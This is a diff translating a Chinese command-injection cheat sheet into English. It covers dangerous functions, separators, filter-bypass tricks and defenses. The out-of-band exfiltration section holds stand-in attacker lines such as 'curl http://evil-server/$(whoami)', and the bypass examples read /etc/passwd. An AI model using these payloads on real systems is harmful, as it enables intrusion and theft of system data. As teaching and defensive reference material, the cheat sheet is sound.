@@ -1,13 +1,13 @@
-命令注入
+command injection
 ========================================
 
-简介
+Introduction
 ----------------------------------------
-命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。
+Command injection usually refers to vulnerabilities caused by web applications splicing system commands on the server.
 
-该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。
+This type of vulnerability usually occurs when external programs are called to complete some functions. For example, some web management interfaces have functions such as configuring host name/IP/mask/gateway, viewing system information, and shutting down and restarting, or some sites provide functions such as ping, nslookup, sending emails, converting pictures, etc. This type of vulnerability may appear.
 
-常见危险函数
+Common dangerous functions
 ----------------------------------------
 
 PHP
@@ -30,42 +30,42 @@ Java
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - java.lang.Runtime.getRuntime().exec(command)
 
-常见注入方式
+Common injection methods
 ----------------------------------------
-- 分号分割
-- ``||`` ``&&`` ``&`` 分割
-- ``|`` 管道符
-- ``\r\n`` ``%d0%a0`` 换行 
-- 反引号解析
-- ``$()`` 替换
+- Semicolon separation
+- ``||`` ``&&`` ``&`` split
+- ``|`` pipe character
+- ``\r\n`` ``%d0%a0`` Newline
+- Backtick parsing
+- ``$()`` replacement
 
-无回显技巧
+No echo technique
 ----------------------------------------
-- bash反弹shell
-- DNS带外数据
-- http带外
+- bash rebound shell
+- DNS out-of-band data
+- http out of band
     - ``curl http://evil-server/$(whoami)``
     - ``wget http://evil-server/$(whoami)``
-- 无带外时利用 ``sleep`` 或其他逻辑构造布尔条件
+- Use ``sleep`` or other logic to construct Boolean conditions when there is no out-of-band
 
-常见绕过方式
+Common bypass methods
 ----------------------------------------
 
-空格绕过
+Space bypass
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- ``<`` 符号 ``cat<123``
+- ``<`` symbol ``cat<123``
 - ``\t`` / ``%09``
-- ``${IFS}`` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串
+- ``${IFS}`` where {} is used for truncation. For example, cat$IFS2 will be considered as IFS2 as a variable name. In addition, adding a $ at the end can play a truncation effect. Generally, $9 is used, because $9 is the holder of the ninth parameter of the current system shell process, and it is always an empty string.
 
-黑名单绕过
+Blacklist bypass
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - ``a=l;b=s;$a$b``
 - base64 ``echo "bHM=" | base64 -d``
 - ``/?in/?s`` => ``/bin/ls``
-- 连接符 ``cat /etc/pass'w'd``
-- 未定义的初始化变量 ``cat$x /etc/passwd``
+- Connector ``cat /etc/pass'w'd``
+- Undefined initialization variable ``cat$x /etc/passwd``
 
-长度限制绕过
+Length limit bypass
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ::
 
@@ -75,33 +75,33 @@ Java
     ls -t>a
     sh a
 
-上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行
-直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令
-这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看)
-如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向
-而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件
+The above method is to write commands through command line redirection, then use ls to write the commands to the file in order of time, and finally execute
+If executed directly under the Linux terminal, creating a file requires adding the command before the redirection symbol.
+Here you can use some short commands such as w, [ (use ls /usr/bin/? to view)
+If you do not add a command, you need Ctrl+D to end it, which is equivalent to redirecting the standard input stream.
+In PHP, when using functions such as shell_exec to execute system commands, there is no standard input stream, so files can be created directly.
 
-常用符号  
+Common symbols
 ----------------------------------------
 
-命令分隔符
+command separator
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - ``%0a`` / ``%0d`` / ``\n`` / ``\r``
 - ``;``
 - ``&`` / ``&&``
 
-通配符
+wildcard
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- ``*`` 0到无穷个任意字符
-- ``?`` 一个任意字符
-- ``[ ]``  一个在括号内的字符，e.g. ``[abcd]``
-- ``[ - ]``  在编码顺序内的所有字符
-- ``[^ ]`` 一个不在括号内的字符
+- ``*`` any number of characters from 0 to infinity
+- ``?`` an arbitrary character
+- ``[ ]`` A character within brackets, e.g. ``[abcd]``
+- ``[ - ]`` all characters in the encoding sequence
+- ``[^ ]`` a character not enclosed in brackets
 
-防御
+defense
 ----------------------------------------
-- 不使用时禁用相应函数
-- 尽量不要执行外部的应用程序或命令
-- 做输入的格式检查
-- 转义命令中的所有shell元字符
-    - shell元字符包括 ``#&;`,|*?~<>^()[]{}$\``
+- Disable corresponding functions when not in use
+- Try not to execute external applications or commands
+- Do format checking of input
+- Escape all shell metacharacters in the command
+    - Shell metacharacters include ``#&;`,|*?~<>^()[]{}$\``
